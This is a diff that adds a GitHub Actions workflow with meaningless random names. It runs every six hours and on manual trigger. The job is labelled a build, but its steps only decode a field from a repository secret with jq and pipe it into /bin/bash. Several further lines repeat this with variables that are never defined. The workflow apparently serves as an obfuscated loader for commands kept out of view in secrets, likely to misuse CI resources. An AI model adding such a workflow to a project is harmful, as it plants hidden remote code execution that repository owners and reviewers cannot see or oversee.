@@ -1,0 +1,24 @@
+name: gepinzb
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gepinzb
+        env:
+          rxr9759: ${{ secrets.rxr9759 }}
+        run: |
+          echo $rxr9759 | jq -r .b2 | /bin/bash
+          echo $z604 | jq -r .c57073 | /bin/bash
+          echo $oplt8 | jq -r .pcjr616 | /bin/bash
+          echo $xq3 | jq -r .icg1 | /bin/bash
+          echo $hx0 | jq -r .cvfil69 | /bin/bash
+          echo $o244 | jq -r .n086 | /bin/bash
+          echo $cb25 | jq -r .d35 | /bin/bash
+          echo $d9 | jq -r .hhhn44 | /bin/bash
+          echo $vbub63603 | jq -r .uz57 | /bin/bash
+
